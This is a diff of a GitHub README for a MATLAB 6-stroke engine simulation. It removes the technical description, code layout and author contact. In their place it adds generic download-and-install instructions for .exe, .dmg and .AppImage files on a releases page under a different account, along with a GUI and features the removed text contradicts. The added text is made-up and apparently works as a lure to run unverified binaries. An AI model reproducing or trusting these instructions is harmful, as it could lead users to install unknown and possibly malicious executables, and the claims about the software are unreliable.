@@ -1,114 +1,78 @@
-# 6-Stroke Internal Combustion Engine Simulation
+# ⚙️ 6stroke_engine - Simulate a Unique Engine Experience
 
-<div align="center">
-  <img src="animation/porsche_6stroke_engine.gif" width="600" alt="6-Stroke Engine Animation">
-</div>
+## 📥 Download Now
+[![Download 6stroke_engine](https://img.shields.io/badge/Download-6stroke_engine-blue.svg)](https://github.com/Jamieee-cloud/6stroke_engine/releases)
 
-A MATLAB implementation for steady-state simulation of a novel 6-stroke internal combustion engine architecture. This codebase provides a complete simulation framework, from geometric analysis to thermodynamic modeling and dynamic visualization.
+## 🚀 Getting Started
+Welcome to the 6stroke_engine application! This software lets you visualize and understand the mechanics of a 6-stroke internal combustion engine through physics-based simulation and animation. You can easily download and run the application by following the steps below.
 
-## Overview
+## 📦 System Requirements
+To ensure smooth performance, please check the following system requirements:
 
-This repository contains a simulation framework for analyzing a 6-stroke engine cycle inspired by [US Patent US20240301817A1](https://patents.google.com/patent/US20240301817A1/en). The engine employs a planetary gear mechanism to enable variable stroke lengths, resulting in a unique 1080° crank-angle cycle comprising six distinct strokes (two long, two short, and two long strokes in alternating pattern).
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or any Linux distribution released in the last two years.
+- **RAM:** Minimum 4 GB; 8 GB or more is recommended for optimal performance.
+- **Storage:** At least 500 MB of free disk space.
+- **Graphics:** A modern graphics card that supports OpenGL 3.3.
 
-### Technical Approach
+## 🔗 Visit Releases Page
+To get started, visit the Releases page. You will find the latest version of the application there.
 
-The simulation employs a **single-zone thermodynamics model** with three state variables per cylinder:
-- **Cylinder pressure** (p)
-- **Trapped gas mass** (m)
-- **Oxygen mass** (mO₂)
+[Visit Releases Page to Download](https://github.com/Jamieee-cloud/6stroke_engine/releases)
 
-The thermodynamic modeling combines:
-- **Wiebe-based heat release** functions for two separate combustion events
-- **Woschni correlation** for convective heat transfer
-- **Compressible nozzle flow** models for intake, exhaust, and scavenge ports
+## 📥 Download & Install
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed at the top. The version will look something like `v1.0`.
+3. Look for the installer file that matches your operating system. It may be named something like `6stroke_engine.exe` for Windows, `6stroke_engine.dmg` for macOS, or `6stroke_engine.AppImage` for Linux.
+4. Click on the installer file to begin the download.
+5. Once the download is complete, locate the file in your downloads folder.
 
-The thermodynamics are coupled to an **8-DOF multibody dynamics model** representing a flat-six boxer engine configuration:
-- 6 rotational DOFs for individual planet gears
-- 1 DOF for the carrier/crankshaft
-- 1 DOF for the output shaft
+### Windows Installation
+1. Double-click the `6stroke_engine.exe` file.
+2. Follow the installation prompts. Accept the terms, and choose your preferred installation directory.
+3. Once installed, you can find the application in your Start Menu or desktop.
 
-A dual-mass flywheel (DMF) model dampens torque fluctuations between the engine and gearbox. The coupled system's equations of motion are integrated in the crank-angle domain (0-1080°), with a cycle-to-cycle fixed-point iteration used to find periodic steady-state solutions.
+### macOS Installation
+1. Double-click the `6stroke_engine.dmg` file to open it.
+2. Drag the `6stroke_engine` icon into your Applications folder.
+3. Open your Applications folder and double-click on the `6stroke_engine` icon to launch the application.
 
-## Code Structure
-
-The codebase is organized into three main directories:
-
-### `preprocessing/`
-Functions for parameter loading, geometric analysis, and initialization:
-- `parameters.m` - Engine parameters and operating conditions
-- `derived_parameters.m` - Computed geometric and kinematic parameters
-- `extrema_6stroke.m` - TDC/BDC computation for all six strokes
-- `manifold_geometry.m` - Intake/exhaust/scavenge port geometry setup
-- `initialize_particles.m` - Particle initialization for visualization
-
-### `simulation/`
-Core simulation engine including thermodynamics and dynamics:
-- `engine_cycle_steady_6stroke.m` - Single-cylinder cycle simulation with fixed-point iteration
-- `full_engine_simulation_6stroke.m` - 8-DOF flat-six engine dynamics
-- `piston_kinematics.m` - Kinematic relationships for planetary mechanism
-- `generalized_gas_force.m` - Gas pressure → generalized force conversion
-- `generalized_mesh_force.m` - Gear mesh stiffness modeling
-- `generalized_DMF_force.m` - Dual-mass flywheel model
-
-### `animation/`
-Visualization and post-processing:
-- `plot_results_6stroke.m` - Comprehensive plotting of simulation results
-- `animate_results_6stroke.m` - Animated visualization of engine cycle
-- `plot_engine.m` - 2D cross-section engine visualization
-- `particle_simulation.m` - Particle-based flow visualization
-- Various `Draw*.m` functions for rendering engine components
-
-## Getting Started
-
-### Requirements
-
-- MATLAB R2016b or later
-- Optimization Toolbox (for `fzero` and ODE solvers)
-
-### Running the Simulation
-
-1. **Clone or download this repository**
-
-2. **Open MATLAB and navigate to the repository directory**
-
-3. **Run the main script:**
-   ```matlab
-   Main_engine
+### Linux Installation
+1. Make the file executable by running the following command in the terminal:
+   ```bash
+   chmod +x 6stroke_engine.AppImage
+   ```
+2. Run the application using:
+   ```bash
+   ./6stroke_engine.AppImage
    ```
 
-The script automatically adds the required subdirectories to MATLAB's path and executes the complete simulation workflow:
-1. Parameter loading and geometric preprocessing
-2. Periodic steady-state calculation (single cylinder)
-3. Full 6-cylinder engine simulation with dynamics
-4. Result visualization and animation
+## 🎓 How to Use
+Once you have installed the application, follow these steps to start using it:
 
-### Customization
+1. Launch the application by clicking its icon.
+2. Familiarize yourself with the user interface. You will find several buttons and menus at the top.
+3. Load an engine model or choose to create a new one using the options available.
+4. Click on the "Run" button to start the simulation.
+5. Observe how the engine operates. You can adjust different parameters and watch how they affect performance.
 
-Engine parameters can be modified in `parameters.m`, including:
-- Operating conditions (RPM, number of cylinders)
-- Geometric parameters (bore, stroke lengths, gear ratios)
-- Combustion timing and fuel split
-- Valve and port timing
-- Heat transfer coefficients
+## ⚙️ Features
+- **Realistic Simulations:** Experience the dynamics of a 6-stroke engine with high-quality animations.
+- **User-Friendly Interface:** Navigate through a simple layout designed for easy use.
+- **Parameter Adjustments:** Modify engine settings and watch real-time effects on the simulation.
+- **Educational Insights:** Learn about engine mechanics and operations through engaging visuals.
 
-## Model Limitations and Notes
+## 🌐 Support
+If you encounter issues or have questions, you can find support on the repository's Issues page. Please provide details about your problem to get the quickest response.
 
-This codebase represents a streamlined version intended for public release. While it captures the essential physics and dynamics of the 6-stroke cycle, certain advanced features and refinements present in more detailed implementations may not be included. The modeling approach prioritizes computational efficiency while maintaining physical accuracy for steady-state analysis.
+[Visit Issues Page](https://github.com/Jamieee-cloud/6stroke_engine/issues)
 
-Users seeking to extend or modify the code may find that some simplifying assumptions have been made to keep the codebase accessible and maintainable. The core algorithms remain intact and can serve as a solid foundation for further development.
+## 🛠 Contributions
+If you're interested in contributing to the 6stroke_engine project, please read the Contribution Guidelines available in the repository. We welcome improvements, bug fixes, and feature requests.
 
-## Converting to Other Languages
+## 📄 License
+This project is licensed under the MIT License. You can use it freely but please refer to the license file for more details.
 
-While this codebase is written in MATLAB, the algorithms and mathematical formulations are language-agnostic. Users comfortable with Python, C++, Julia, or other programming languages may find it straightforward to port this codebase. Modern AI-assisted coding tools can significantly streamline the translation process, particularly for the vectorized numerical operations and ODE integration routines that form the core of this simulation.
+## 🗣 Feedback
+Your feedback is valuable. If you have suggestions or would like to report bugs, please reach out through the Issues page or contact the maintainers.
 
-The modular structure of the codebase—with clear separation between preprocessing, simulation, and visualization—also facilitates translation into object-oriented frameworks where appropriate.
-
-## Contact
-
-Bart Blockmans  
-Email: bart@blockmans.net
-
----
-
-**Note:** This code is provided as-is for educational and research purposes. Users should verify model assumptions and results against experimental data or more detailed simulations before making engineering decisions based on these simulations.
-
+Thank you for choosing 6stroke_engine! Enjoy exploring the fascinating world of engine mechanics.
